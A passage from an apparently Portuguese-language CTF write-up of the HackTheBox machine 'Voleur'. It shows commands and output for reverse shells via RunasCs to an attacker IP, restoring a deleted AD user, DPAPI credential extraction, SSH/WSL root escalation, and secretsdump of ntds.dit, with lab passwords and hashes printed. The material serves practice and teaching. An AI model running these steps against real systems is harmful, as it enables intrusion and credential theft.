</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Running in session <span class=m>0</span> with process <span class=k>function</span> CreateProcessWithLogonW<span class=o>()</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Using Station<span class=se>\D</span>esktop: Service-0x0-8ae0a3$<span class=se>\D</span>efault
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Async process <span class=s1>&#39;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#39;</span> with pid <span class=m>620</span> created in background.
</span></span></code></pre></div><p>E com o listener aberto, conseguimos a shell do <strong>SVC_LDAP</strong>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; rlwrap nc -lvnp <span class=m>4444</span>
</span></span><span class=line><span class=cl>Ncat: Version 7.93 <span class=o>(</span> https://nmap.org/ncat <span class=o>)</span>
</span></span><span class=line><span class=cl>Ncat: Listening on :::4444
</span></span><span class=line><span class=cl>Ncat: Listening on 0.0.0.0:4444
</span></span><span class=line><span class=cl>Ncat: Connection from 10.129.102.81.
</span></span><span class=line><span class=cl>Ncat: Connection from 10.129.102.81:53763.
</span></span><span class=line><span class=cl>Windows PowerShell
</span></span><span class=line><span class=cl>Copyright <span class=o>(</span>C<span class=o>)</span> Microsoft Corporation. All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Install the latest PowerShell <span class=k>for</span> new features and improvements! https://aka.ms/PSWindows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PS C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt; 
</span></span></code></pre></div><h3 class="relative group">Restaurando o usuário TODD.WOLFE<div id=restaurando-o-usuário-toddwolfe class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#restaurando-o-usu%c3%a1rio-toddwolfe aria-label=Âncora>#</a></span></h3><p>Como o <strong>SVC_LDAP</strong> faz parte do grupo <strong>RESTORE_USERS</strong>, podemos listar usuários no modo “tombstone” no AD. Esse modo tombstone é semelhante a uma &ldquo;lixeira de usuários&rdquo;, todo usuário deletado fica nesse &ldquo;modo&rdquo; por um certo tempo, depois ele é deletado completamente. Para listar usuários nesse modo, podemos utilizar o seguinte comando:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; Get-ADObject -Filter * -IncludeDeletedObjects
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Deleted           : True
</span></span><span class=line><span class=cl>DistinguishedName : <span class=nv>CN</span><span class=o>=</span>Todd Wolfe<span class=se>\0</span>ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN<span class=o>=</span>Deleted Objects,DC<span class=o>=</span>voleur,DC<span class=o>=</span>htb
</span></span><span class=line><span class=cl>Name              : Todd Wolfe
</span></span><span class=line><span class=cl>                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
</span></span><span class=line><span class=cl>ObjectClass       : user
</span></span><span class=line><span class=cl>ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...
</span></span></code></pre></div><p>Irá aparecer vários usuários, porém o interessante é o <strong>TODD.WOLFE</strong>. Para restaurar ele, usamos o comando:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; Restore-ADObject -Identity <span class=s2>&#34;1c6b1deb-c372-4cbb-87b1-15031de169db&#34;</span>
</span></span></code></pre></div><p>Com isso, restauramos o <strong>TODD.WOLFE</strong>. Assim como o <strong>SVC_LDAP</strong> que não tem a permissão de logar remotamente, o <strong>TODD.WOLFE</strong> também não possui. Então precisaremos utilizar novamente o <code>RunasCs</code> para obter uma reverse shell:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; *Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc_winrm<span class=se>\D</span>ocuments&gt; ./runas.exe todd.wolfe <span class=s1>&#39;NightT1meP1dg3on14&#39;</span> powershell -r 10.10.14.48:5555
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Warning: The logon <span class=k>for</span> user <span class=s1>&#39;todd.wolfe&#39;</span> is limited. Use the flag combination --bypass-uac and --logon-type <span class=s1>&#39;8&#39;</span> to obtain a more privileged token.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Running in session <span class=m>0</span> with process <span class=k>function</span> CreateProcessWithLogonW<span class=o>()</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Using Station<span class=se>\D</span>esktop: Service-0x0-8ae0a3$<span class=se>\D</span>efault
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Async process <span class=s1>&#39;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#39;</span> with pid <span class=m>1428</span> created in background.
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; rlwrap nc -lvnp <span class=m>5555</span>
</span></span><span class=line><span class=cl>Ncat: Version 7.93 <span class=o>(</span> https://nmap.org/ncat <span class=o>)</span>
</span></span><span class=line><span class=cl>Ncat: Listening on :::5555
</span></span><span class=line><span class=cl>Ncat: Listening on 0.0.0.0:5555
</span></span><span class=line><span class=cl>Ncat: Connection from 10.129.102.81.
</span></span><span class=line><span class=cl>Ncat: Connection from 10.129.102.81:53822.
</span></span><span class=line><span class=cl>Windows PowerShell
</span></span><span class=line><span class=cl>Copyright <span class=o>(</span>C<span class=o>)</span> Microsoft Corporation. All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Install the latest PowerShell <span class=k>for</span> new features and improvements! https://aka.ms/PSWindows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PS C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt; 
</span></span></code></pre></div><h3 class="relative group">Extraindo o DPAPI do TODD.WOLFE para obter a senha do JEREMY.COMBS<div id=extraindo-o-dpapi-do-toddwolfe-para-obter-a-senha-do-jeremycombs class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#extraindo-o-dpapi-do-toddwolfe-para-obter-a-senha-do-jeremycombs aria-label=Âncora>#</a></span></h3><p>Com a shell do <strong>TODD.WOLFE</strong>, podemos acessar a pasta <code>IT/Second-Line Support/Archived Users</code>, la existe uma pasta chamada <code>todd.wolfe</code>, que aparenta ser um backup da pasta de usuário do <strong>TODD.WOLFE</strong>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; PS C:<span class=se>\I</span>T<span class=se>\S</span>econd-Line Support<span class=se>\A</span>rchived Users<span class=se>\t</span>odd.wolfe&gt; ls
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    Directory: C:<span class=se>\I</span>T<span class=se>\S</span>econd-Line Support<span class=se>\A</span>rchived Users<span class=se>\t</span>odd.wolfe
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Mode                 LastWriteTime         Length Name                                                                 
</span></span><span class=line><span class=cl>----                 -------------         ------ ----                                                                 
</span></span><span class=line><span class=cl>d-r---         1/29/2025   7:13 AM                3D Objects                                                           
</span></span><span class=line><span class=cl>d-r---         1/29/2025   7:13 AM                Contacts                                                             
</span></span><span class=line><span class=cl>d-r---         1/30/2025   6:28 AM                Desktop                                                              
</span></span><span class=line><span class=cl>d-r---         1/29/2025   7:13 AM                Documents                                                            
</span></span><span class=line><span class=cl>d-r---         1/29/2025   7:13 AM                Downloads                                                            
</span></span><span class=line><span class=cl>d-r---         1/29/2025   7:13 AM                Favorites                                                            
</span></span><span class=line><span class=cl>d-r---         1/29/2025   7:13 AM                Links                                                                
</span></span><span class=line><span class=cl>d-r---         1/29/2025   7:13 AM                Music                                                                
</span></span><span class=line><span class=cl>d-r---         1/29/2025   7:13 AM                Pictures                                                             
</span></span><span class=line><span class=cl>d-r---         1/29/2025   7:13 AM                Saved Games                                                          
</span></span><span class=line><span class=cl>d-r---         1/29/2025   7:13 AM                Searches                                                             
</span></span><span class=line><span class=cl>d-r---         1/29/2025   7:13 AM                Videos         
</span></span></code></pre></div><p>Olhando as pastas, vemos que na <code>Desktop</code> existe um atalho do <code>Microsoft Edge</code>, e normalmente quanto existe um arquivo <code>.lnk</code> em uma máquina de CTF, significa que um browser foi utilizado por esse usuário, o que levanta suspeitas de dados salvos no <code>DPAPI</code>.</p><p>Seguindo o post do <a href=https://www.thehacker.recipes target=_blank>The Hackers Recipe</a> a respeito de <a href=https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets#dpapi-secrets target=_blank>DPAPI secrets</a>, podemos extrair as senhas salvas utilizando o <strong>DPAPI (Data Protection API)</strong>, que é um componente interno nos sistemas Windows.</p><p>Para extrair esses dados, precisamos pegar a chave e os dados criptografados e baixar localmente. A chave fica no diretório:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\$</span>USER<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>icrosoft<span class=se>\P</span>rotect<span class=se>\$</span>SUID<span class=se>\$</span>GUID
</span></span></code></pre></div><p>Nesse caso, ela fica em:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\I</span>T<span class=se>\S</span>econd-Line Support<span class=se>\A</span>rchived Users<span class=se>\t</span>odd.wolfe<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>icrosoft<span class=se>\P</span>rotect<span class=se>\S</span>-1-5-21-3927696377-1337352550-2781715495-1110<span class=se>\0</span>8949382-134f-4c63-b93c-ce52efc0aa88
</span></span></code></pre></div><p>E os dados criptografados ficam em:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\$</span>USER<span class=se>\A</span>ppData<span class=se>\L</span>ocal<span class=se>\M</span>icrosoft<span class=se>\C</span>redentials<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>C:<span class=se>\U</span>sers<span class=se>\$</span>USER<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>icrosoft<span class=se>\C</span>redentials<span class=se>\
</span></span></span></code></pre></div><p>Nesse caso:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\I</span>T<span class=se>\S</span>econd-Line Support<span class=se>\A</span>rchived Users<span class=se>\t</span>odd.wolfe<span class=se>\A</span>ppData<span class=se>\L</span>ocal<span class=se>\M</span>icrosoft<span class=se>\C</span>redentials
</span></span><span class=line><span class=cl>C:<span class=se>\I</span>T<span class=se>\S</span>econd-Line Support<span class=se>\A</span>rchived Users<span class=se>\t</span>odd.wolfe<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>icrosoft<span class=se>\C</span>redentials
</span></span></code></pre></div><p>Para baixar os arquivos, devemos converter em base64 e copiar. Para isso usamos os comando:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># CHAVE</span>
</span></span><span class=line><span class=cl>&gt; <span class=o>[</span>Convert<span class=o>]</span>::ToBase64String<span class=o>((</span>Get-Content -Path <span class=s2>&#34;C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\08949382-134f-4c63-b93c-ce52efc0aa88&#34;</span> -Encoding Byte -Raw<span class=o>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># DADOS</span>
</span></span><span class=line><span class=cl>&gt; <span class=o>[</span>Convert<span class=o>]</span>::ToBase64String<span class=o>((</span>Get-Content -Path <span class=s2>&#34;C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3&#34;</span> -Encoding Byte -Raw<span class=o>))</span>
</span></span></code></pre></div><p>Com os dois arquivos baixados e decodificados de volta do base64, podemos descriptografa-los com o <code>dpapi.py</code>. Para isso usaremos o seguinte comando:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># CHAVE</span>
</span></span><span class=line><span class=cl>&gt; dpapi.py masterkey -file chave -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password <span class=s1>&#39;NightT1meP1dg3on14&#39;</span>
</span></span><span class=line><span class=cl>Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>MASTERKEYFILE<span class=o>]</span>
</span></span><span class=line><span class=cl>Version     :        <span class=m>2</span> <span class=o>(</span>2<span class=o>)</span>
</span></span><span class=line><span class=cl>Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
</span></span><span class=line><span class=cl>Flags       :        <span class=m>0</span> <span class=o>(</span>0<span class=o>)</span>
</span></span><span class=line><span class=cl>Policy      :        <span class=m>0</span> <span class=o>(</span>0<span class=o>)</span>
</span></span><span class=line><span class=cl>MasterKeyLen: <span class=m>00000088</span> <span class=o>(</span>136<span class=o>)</span>
</span></span><span class=line><span class=cl>BackupKeyLen: <span class=m>00000068</span> <span class=o>(</span>104<span class=o>)</span>
</span></span><span class=line><span class=cl>CredHistLen : <span class=m>00000000</span> <span class=o>(</span>0<span class=o>)</span>
</span></span><span class=line><span class=cl>DomainKeyLen: <span class=m>00000174</span> <span class=o>(</span>372<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Decrypted key with User Key <span class=o>(</span>MD4 protected<span class=o>)</span>
</span></span><span class=line><span class=cl>Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># DADOS</span>
</span></span><span class=line><span class=cl>&gt; dpapi.py credential -file dados -key <span class=s1>&#39;0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83&#39;</span>
</span></span><span class=line><span class=cl>Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>CREDENTIAL<span class=o>]</span>
</span></span><span class=line><span class=cl>LastWritten : 2025-01-29 12:55:19+00:00
</span></span><span class=line><span class=cl>Flags       : 0x00000030 <span class=o>(</span>CRED_FLAGS_REQUIRE_CONFIRMATION<span class=p>|</span>CRED_FLAGS_WILDCARD_MATCH<span class=o>)</span>
</span></span><span class=line><span class=cl>Persist     : 0x00000003 <span class=o>(</span>CRED_PERSIST_ENTERPRISE<span class=o>)</span>
</span></span><span class=line><span class=cl>Type        : 0x00000002 <span class=o>(</span>CRED_TYPE_DOMAIN_PASSWORD<span class=o>)</span>
</span></span><span class=line><span class=cl>Target      : Domain:target<span class=o>=</span>Jezzas_Account
</span></span><span class=line><span class=cl>Description : 
</span></span><span class=line><span class=cl>Unknown     : 
</span></span><span class=line><span class=cl>Username    : jeremy.combs
</span></span><span class=line><span class=cl>Unknown     : qT3V9pLXyN7W4m
</span></span></code></pre></div><p>Com isso conseguimos a senha do <strong>JEREMY.COMBS</strong> e consequentemente o ticket TGT dele.</p><h3 class="relative group">Obtendo a chave do SSH e obtendo a hash do Administrator<div id=obtendo-a-chave-do-ssh-e-obtendo-a-hash-do-administrator class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#obtendo-a-chave-do-ssh-e-obtendo-a-hash-do-administrator aria-label=Âncora>#</a></span></h3><p>Com a conta do <strong>JEREMY.COMBS</strong>, temos acesso a pasta <code>Third-Line Support</code> na share <code>IT</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; smbclient //dc.voleur.htb/IT --use-kerberos<span class=o>=</span>required --use-krb5-ccache<span class=o>=</span>/tmp/krb5cc_0               
</span></span><span class=line><span class=cl>Try <span class=s2>&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> ls
</span></span><span class=line><span class=cl>  .                                   D        <span class=m>0</span>  Wed Jan <span class=m>29</span> 06:10:01 <span class=m>2025</span>
</span></span><span class=line><span class=cl>  ..                                DHS        <span class=m>0</span>  Mon Jun <span class=m>30</span> 18:08:33 <span class=m>2025</span>
</span></span><span class=line><span class=cl>  Third-Line Support                  D        <span class=m>0</span>  Thu Jan <span class=m>30</span> 13:11:29 <span class=m>2025</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=m>5311743</span> blocks of size 4096. <span class=m>885469</span> blocks available
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> <span class=nb>cd</span> <span class=s2>&#34;Third-Line Support&#34;</span>
</span></span><span class=line><span class=cl>smb: <span class=se>\T</span>hird-Line Support<span class=se>\&gt;</span> ls
</span></span><span class=line><span class=cl>  .                                   D        <span class=m>0</span>  Thu Jan <span class=m>30</span> 13:11:29 <span class=m>2025</span>
</span></span><span class=line><span class=cl>  ..                                  D        <span class=m>0</span>  Wed Jan <span class=m>29</span> 06:10:01 <span class=m>2025</span>
</span></span><span class=line><span class=cl>  id_rsa                              A     <span class=m>2602</span>  Thu Jan <span class=m>30</span> 13:10:54 <span class=m>2025</span>
</span></span><span class=line><span class=cl>  Note.txt.txt                        A      <span class=m>186</span>  Thu Jan <span class=m>30</span> 13:07:35 <span class=m>2025</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=m>5311743</span> blocks of size 4096. <span class=m>885469</span> blocks available
</span></span><span class=line><span class=cl>smb: <span class=se>\T</span>hird-Line Support<span class=se>\&gt;</span> 
</span></span></code></pre></div><p>Aqui encontramos uma chave SSH e uma nota escrito:</p><blockquote><p>Jeremy,<br><br>I&rsquo;ve had enough of Windows Backup! I&rsquo;ve part configured WSL to see if we can utilize any of the backup tools from Linux.
Please see what you can set up.<br><br>Thanks,<br>Admin</p></blockquote><p>Resumidamente, essa chave é usada na porta 2222 que descobrimos la no inicio, ela é do usuário <strong>SVC_BACKUP</strong> (descobrimos isso anteriormente no arquivo XLSX) e possui acesso a pasta <code>backup</code> da <code>IT</code>.</p><p>Usando a chave para logar no SSH:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; ssh voleur.htb -l svc_backup -p <span class=m>2222</span> -i id_rsa
</span></span><span class=line><span class=cl>Welcome to Ubuntu 20.04 LTS <span class=o>(</span>GNU/Linux 4.4.0-20348-Microsoft x86_64<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> * Documentation:  https://help.ubuntu.com
</span></span><span class=line><span class=cl> * Management:     https://landscape.canonical.com
</span></span><span class=line><span class=cl> * Support:        https://ubuntu.com/advantage
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  System information as of Wed Jul  <span class=m>9</span> 01:57:21 PDT <span class=m>2025</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  System load:    0.52      Processes:             <span class=m>9</span>
</span></span><span class=line><span class=cl>  Usage of /home: unknown   Users logged in:       <span class=m>0</span>
</span></span><span class=line><span class=cl>  Memory usage:   33%       IPv4 address <span class=k>for</span> eth0: 10.129.102.81
</span></span><span class=line><span class=cl>  Swap usage:     0%
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>363</span> updates can be installed immediately.
</span></span><span class=line><span class=cl><span class=m>257</span> of these updates are security updates.
</span></span><span class=line><span class=cl>To see these additional updates run: apt list --upgradable
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The list of available updates is more than a week old.
</span></span><span class=line><span class=cl>To check <span class=k>for</span> new updates run: sudo apt update
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Last login: Thu Jan <span class=m>30</span> 04:26:24 <span class=m>2025</span> from 127.0.0.1
</span></span><span class=line><span class=cl> * Starting OpenBSD Secure Shell server sshd                                                                                                                                           <span class=o>[</span> OK <span class=o>]</span> 
</span></span><span class=line><span class=cl>svc_backup@DC:~$ 
</span></span></code></pre></div><p>Usando o comando <code>sudo -l</code>, vemos que temos permissões completas, então apenas usando <code>sudo su</code> conseguimos root na máquina Linux:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; svc_backup@DC:/$ sudo -l
</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> svc_backup on DC:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass, <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin<span class=se>\:</span>/snap/bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User svc_backup may run the following commands on DC:
</span></span><span class=line><span class=cl>    <span class=o>(</span>ALL : ALL<span class=o>)</span> ALL
</span></span><span class=line><span class=cl>    <span class=o>(</span>ALL<span class=o>)</span> NOPASSWD: ALL
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&gt; svc_backup@DC:/$ sudo su
</span></span><span class=line><span class=cl>root@DC:/# 
</span></span></code></pre></div><p>Analisando as pastas do <code>/mnt</code>, vemos que na pasta: <code>/mnt/c/IT/Third-Line Support/Backups</code> existe um backup do <code>SAM/LSA</code>, podemos baixar localmente e extrair as hashs usando o <code>secretsdump.py</code>. Para baixar a pasta irei usar o <code>scp</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; scp -i id_rsa -P <span class=m>2222</span> -r svc_backup@voleur.htb:/mnt/c/IT/Third-Line<span class=se>\ </span>Support/Backups/ ./
</span></span><span class=line><span class=cl>ntds.dit                                                                                                                                                    100%   24MB   2.3MB/s   00:10    
</span></span><span class=line><span class=cl>ntds.jfm                                                                                                                                                    100%   16KB  36.5KB/s   00:00    
</span></span><span class=line><span class=cl>SECURITY                                                                                                                                                    100%   32KB  73.2KB/s   00:00    
</span></span><span class=line><span class=cl>SYSTEM                                                                                                                                                      100%   18MB   2.1MB/s   00:08    
</span></span></code></pre></div><p>E utilizando o <code>secretsdump.py</code> localmente, extraimos as hashs e solicitamos o TGT do <strong>Administrator</strong>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; secretsdump -ntds <span class=s2>&#34;Active Directory/ntds.dit&#34;</span> -system <span class=s2>&#34;registry/SYSTEM&#34;</span> -security <span class=s2>&#34;Pregistry/SECURITY&#34;</span> LOCAL
</span></span><span class=line><span class=cl>Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> LSA hashes extraction failed: <span class=o>[</span>Errno 2<span class=o>]</span> No such file or directory: <span class=s1>&#39;Pregistry/SECURITY&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Dumping Domain Credentials <span class=o>(</span>domain<span class=se>\u</span>id:rid:lmhash:nthash<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Searching <span class=k>for</span> pekList, be patient
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> PEK <span class=c1># 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Reading and decrypting hashes from Active Directory/ntds.dit 
</span></span><span class=line><span class=cl>Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
</span></span><span class=line><span class=cl>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span class=line><span class=cl>DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
</span></span><span class=line><span class=cl>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\r</span>yan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\m</span>arie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\l</span>acey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\*</span>*SVC_LDAP**:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\s</span>vc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\s</span>vc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\j</span>eremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\s</span>vc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Kerberos keys from Active Directory/ntds.dit 
</span></span><span class=line><span class=cl>Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
</span></span><span class=line><span class=cl>Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
</span></span><span class=line><span class=cl>Administrator:des-cbc-md5:459d836b9edcd6b0
</span></span><span class=line><span class=cl>DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
</span></span><span class=line><span class=cl>DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
</span></span><span class=line><span class=cl>DC$:des-cbc-md5:64e05b6d1abff1c8
</span></span><span class=line><span class=cl>krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
</span></span><span class=line><span class=cl>krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
</span></span><span class=line><span class=cl>krbtgt:des-cbc-md5:34ae31d073f86d20
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\r</span>yan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\r</span>yan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\r</span>yan.naylor:des-cbc-md5:4376f7917a197a5b
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\m</span>arie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\m</span>arie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\m</span>arie.bryant:des-cbc-md5:cdf1492604d3a220
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\l</span>acey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\l</span>acey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\l</span>acey.miller:des-cbc-md5:6eef922076ba7675
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\*</span>*SVC_LDAP**:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
